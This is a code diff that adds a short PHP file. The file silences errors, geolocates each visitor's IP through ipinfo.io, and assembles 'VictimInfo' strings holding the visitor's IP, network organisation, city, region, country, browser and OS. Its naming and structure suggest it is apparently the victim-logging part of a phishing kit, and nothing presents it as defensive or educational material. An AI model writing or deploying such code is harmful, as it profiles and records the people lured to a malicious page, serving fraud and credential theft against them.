@@ -1,0 +1,9 @@
+<?php @error_reporting(0);
+$ip = $_SERVER['REMOTE_ADDR'];
+$nggon = curl("https://ipinfo.io/".$ip."/json");
+$lokasi = json_decode($nggon);
+$VictimInfo1 = ""."".$_SERVER['REMOTE_ADDR']." - [".$lokasi->org."]";
+$VictimInfo2 = ""."".$lokasi->city.", ".$lokasi->region.", ".$lokasi->country."";
+$VictimInfo4 = ""."".$systemInfo['browser'];
+$VictimInfo5 = ""."".$systemInfo['os'];
+?>
